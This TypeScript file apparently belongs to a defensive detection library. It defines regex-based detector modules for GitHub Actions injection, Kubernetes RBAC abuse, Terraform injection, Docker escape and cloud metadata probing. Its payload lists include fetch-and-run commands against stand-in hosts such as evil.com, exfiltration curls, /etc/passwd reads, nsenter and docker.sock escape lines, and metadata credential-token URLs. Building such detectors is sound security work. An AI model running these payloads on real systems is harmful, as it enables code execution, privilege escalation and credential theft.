import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

const GHA_SET_OUTPUT_RE = /::set-output\s+name=[^:\r\n]+::/i
const GHA_ADD_MASK_RE = /::add-mask::/i
const GHA_SET_ENV_RE = /::set-env\s+name=[^:\r\n]+::/i
const GHA_USER_EXPR_IN_RUN_RE = /run\s*:\s*[^\n]*\$\{\{\s*github\.event\.(?:issue|pull_request|comment|head_commit|inputs)\.[^}]+\}\}/i
const GHA_EXPR_INJECTION_RE = /(?:\$\{\{[^}]+\}\}|\$\([^)]+\)|`[^`]+`|\$[A-Za-z_][A-Za-z0-9_]*)/
const GHA_GITHUB_ENV_WRITE_RE = /(?:>>\s*\$GITHUB_ENV|\$GITHUB_ENV\s*<<|GITHUB_ENV=)/i
const GHA_EXFIL_RE = /\b(?:curl|wget|Invoke-WebRequest|nc|scp)\b/i

const K8S_SUBJECT_ACCESS_RE = /\/apis\/authorization\.k8s\.io\/v1(?:beta1)?\/subjectaccessreviews/i
const K8S_SYSTEM_SECRETS_RE = /\/api\/v1\/namespaces\/kube-system\/secrets(?:\/|\b)/i
const K8S_WILDCARD_VERBS_RE = /(?:verbs\s*:\s*\[\s*\*\s*\]|["']verbs["']\s*:\s*\[\s*["']\*["']\s*\])/i
const K8S_EXEC_ATTACH_SYSTEM_RE = /(?:\/api\/v1\/namespaces\/kube-system\/pods\/[^\/\s]+\/(?:exec|attach)|\bkubectl\s+exec\b[^\n]*(?:--namespace(?:=|\s+)kube-system|-n\s+kube-system))/i
const K8S_TTY_EXEC_RE = /\bkubectl\s+exec\b[^\n]*(?:--stdin|-i)[^\n]*(?:--tty|-t)/i

const TF_FILE_ABS_RE = /\$\{\s*file\s*\(\s*["']\/(?:etc|proc|root|home|var|tmp)[^"']*["']\s*\)\s*\}/i
const TF_LOCAL_EXEC_URL_RE = /provisioner\s+"local-exec"[\s\S]{0,260}command\s*=\s*["'][^"']*(?:curl|wget)[^"']*(?:https?:\/\/|[A-Za-z0-9.-]+\.[A-Za-z]{2,})[^"']*["']/i
const TF_DATA_EXTERNAL_RESULT_RE = /data\.external\.[A-Za-z0-9_-]+\.result/i
const TF_DATA_EXTERNAL_CMD_RE = /data\s+"external"[\s\S]{0,260}(?:program|query)\s*=\s*\[[^\]]*(?:bash|sh|python|curl|wget|nc|powershell)/i

const DOCKER_PROC_PID1_RE = /\/proc\/1\/(?:root|mounts|ns|cgroup|environ|fd)(?:\/|\b)/i
const DOCKER_SOCK_RE = /(?:\/var\/run\/docker\.sock|docker\.sock)/i
const DOCKER_NSENTER_RE = /\bnsenter\s+--target\s+1\b[^\n]*(?:--mount|-m)[^\n]*(?:--uts|-u)/i
const DOCKER_PRIVILEGED_RE = /(?:--privileged\b|["']?Privileged["']?\s*:\s*true)/i

const META_AWS_IPV6_RE = /(?:http:\/\/)?fd00:ec2::254\/latest\/meta-data\//i
const META_GCP_RE = /metadata\.google\.internal\/computeMetadata\/v1\/instance\/service-accounts\/default\/token/i
const META_AZURE_RE = /169\.254\.169\.254\/metadata\/instance(?:\?|\/|\b)/i
const META_IMDSV2_PUT_RE = /\bPUT\b[\s\S]{0,180}169\.254\.169\.254[\s\S]{0,220}x-aws-ec2-metadata-token-ttl-seconds\s*:/i

export const githubActionsInjection: InvariantClassModule = {
    id: 'github_actions_injection',
    description: 'GitHub Actions workflow command injection via user-controlled expressions, command directives, and environment file writes',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1195.002', 'T1059.004'],
    cwe: 'CWE-94',
    knownPayloads: [
        'echo "::set-output name=result::$(id)"',
        'run: echo ${{ github.event.issue.title }}',
        'echo "::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}"\ncurl https://evil.example/exfil',
        'echo "MALICIOUS=$(curl https://evil.example)" >> $GITHUB_ENV',
    ],
    knownBenign: [
        'echo "hello"',
        'run: npm install',
        'echo "::notice::Build complete"',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        if (GHA_SET_OUTPUT_RE.test(d)) return true
        if (GHA_SET_ENV_RE.test(d) && GHA_EXPR_INJECTION_RE.test(d)) return true
        if (GHA_USER_EXPR_IN_RUN_RE.test(d)) return true
        if (GHA_GITHUB_ENV_WRITE_RE.test(d) && GHA_EXPR_INJECTION_RE.test(d)) return true
        if (GHA_ADD_MASK_RE.test(d) && (GHA_EXFIL_RE.test(d) || /secrets?\./i.test(d))) return true
        return false
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'echo "::set-output name=result::$(id)"',
            'run: echo ${{ github.event.issue.title }}',
            'echo "::add-mask::${{ secrets.AWS_SECRET_ACCESS_KEY }}"\ncurl https://evil.example/exfil',
            'echo "MALICIOUS=$(curl https://evil.example)" >> $GITHUB_ENV',
        ]
        return variants.slice(0, count)
    },
}

export const kubernetesRbacAbuse: InvariantClassModule = {
    id: 'kubernetes_rbac_abuse',
    description: 'Kubernetes RBAC abuse attempts using authz probing, wildcard privileges, and system namespace exec/secret access',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1068', 'T1078'],
    cwe: 'CWE-269',
    knownPayloads: [
        '/apis/authorization.k8s.io/v1/subjectaccessreviews',
        'kubectl exec --stdin --tty pod/etcd-0 --namespace kube-system -- sh',
        '/api/v1/namespaces/kube-system/secrets',
        'rules: [{ apiGroups:["*"], resources:["*"], verbs:[*] }]',
    ],
    knownBenign: [
        '/api/v1/pods',
        '/api/v1/services',
        'kubectl get pods',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return (
            K8S_SUBJECT_ACCESS_RE.test(d) ||
            K8S_SYSTEM_SECRETS_RE.test(d) ||
            K8S_WILDCARD_VERBS_RE.test(d) ||
            K8S_EXEC_ATTACH_SYSTEM_RE.test(d) ||
            K8S_TTY_EXEC_RE.test(d)
        )
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '/apis/authorization.k8s.io/v1/subjectaccessreviews',
            'kubectl exec --stdin --tty pod/etcd-0 --namespace kube-system -- sh',
            '/api/v1/namespaces/kube-system/secrets',
            'rules: [{ apiGroups:["*"], resources:["*"], verbs:[*] }]',
        ]
        return variants.slice(0, count)
    },
}

export const terraformInjection: InvariantClassModule = {
    id: 'terraform_injection',
    description: 'Terraform HCL injection via dangerous interpolation, local-exec abuse, and external data command execution',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.86 },
    mitre: ['T1190', 'T1059.004'],
    cwe: 'CWE-94',
    knownPayloads: [
        '${file("/etc/passwd")}',
        'resource "null_resource" "x" { provisioner "local-exec" { command = "curl evil.com/p.sh | sh" } }',
        'data.external.cmd.result',
        'data "external" "pwn" { program = ["bash","-c","curl https://evil.com"] }',
    ],
    knownBenign: [
        '${var.region}',
        'resource "aws_s3_bucket" "main" {}',
        'var.instance_type',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return TF_FILE_ABS_RE.test(d) || TF_LOCAL_EXEC_URL_RE.test(d) || TF_DATA_EXTERNAL_RESULT_RE.test(d) || TF_DATA_EXTERNAL_CMD_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '${file("/etc/passwd")}',
            'resource "null_resource" "x" { provisioner "local-exec" { command = "curl evil.com/p.sh | sh" } }',
            'data.external.cmd.result',
            'data "external" "pwn" { program = ["bash","-c","curl https://evil.com"] }',
        ]
        return variants.slice(0, count)
    },
}

export const dockerEscapeIndicator: InvariantClassModule = {
    id: 'docker_escape_indicator',
    description: 'Container escape indicators via host PID1 traversal, docker socket access, nsenter, and privileged container creation',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.91 },
    mitre: ['T1611', 'T1068'],
    cwe: 'CWE-250',
    knownPayloads: [
        'POST /containers/create?name=pwn {"HostConfig":{"Privileged":true}}',
        '/proc/1/root/../../../etc/passwd',
        '/var/run/docker.sock',
        'nsenter --target 1 --mount --uts --ipc --net sh',
    ],
    knownBenign: [
        'docker build .',
        'docker run app',
        '/proc/self/status',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return DOCKER_PROC_PID1_RE.test(d) || DOCKER_SOCK_RE.test(d) || DOCKER_NSENTER_RE.test(d) || DOCKER_PRIVILEGED_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'POST /containers/create?name=pwn {"HostConfig":{"Privileged":true}}',
            '/proc/1/root/../../../etc/passwd',
            '/var/run/docker.sock',
            'nsenter --target 1 --mount --uts --ipc --net sh',
        ]
        return variants.slice(0, count)
    },
}

export const cloudMetadataAdvanced: InvariantClassModule = {
    id: 'cloud_metadata_advanced',
    description: 'Advanced cloud metadata probing across AWS/GCP/Azure endpoints, including IMDSv2 token acquisition behavior',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1552', 'T1190'],
    cwe: 'CWE-918',
    knownPayloads: [
        'http://fd00:ec2::254/latest/meta-data/iam/security-credentials/',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
        'PUT http://169.254.169.254/latest/api/token\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600',
    ],
    knownBenign: [
        'http://example.com/metadata',
        '/api/metadata',
        'GET /v1/public/metadata',
    ],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return META_AWS_IPV6_RE.test(d) || META_GCP_RE.test(d) || META_AZURE_RE.test(d) || META_IMDSV2_PUT_RE.test(d)
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'http://fd00:ec2::254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'PUT http://169.254.169.254/latest/api/token\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600',
        ]
        return variants.slice(0, count)
    },
}

export const INFRA_ATTACK_CLASSES: InvariantClassModule[] = [
    githubActionsInjection,
    kubernetesRbacAbuse,
    terraformInjection,
    dockerEscapeIndicator,
    cloudMetadataAdvanced,
]
